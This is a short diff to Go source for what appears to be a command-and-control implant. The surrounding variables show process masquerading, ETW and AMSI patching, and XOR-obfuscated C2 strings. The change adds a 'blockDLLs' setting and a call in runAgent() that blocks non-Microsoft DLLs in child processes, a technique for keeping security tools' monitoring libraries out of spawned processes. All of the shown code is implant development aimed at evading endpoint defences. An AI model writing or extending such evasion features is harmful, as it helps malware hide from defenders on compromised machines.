@@ -59,6 +59,7 @@ var (
 	masqueradeName    string = ""     // Process name masquerade (Linux: prctl PR_SET_NAME)
 	customHeaders     string = ""     // Base64-encoded JSON of additional HTTP headers
 	autoPatch         string = ""     // Auto-patch ETW and AMSI at startup (Windows only)
+	blockDLLs         string = ""     // Block non-Microsoft DLLs in child processes (Windows only)
 	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
 )
 
@@ -266,6 +267,11 @@ func runAgent() {
 		commands.SetRpfwdManager(rpfwdManager)
 		httpProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
 		httpProfile.HandleRpfwd = rpfwdManager.HandleMessages
+	}
+
+	// Configure child process protections (Windows: block non-Microsoft DLLs)
+	if blockDLLs == "true" {
+		commands.SetBlockDLLs(true)
 	}
 
 	// Initialize command handlers
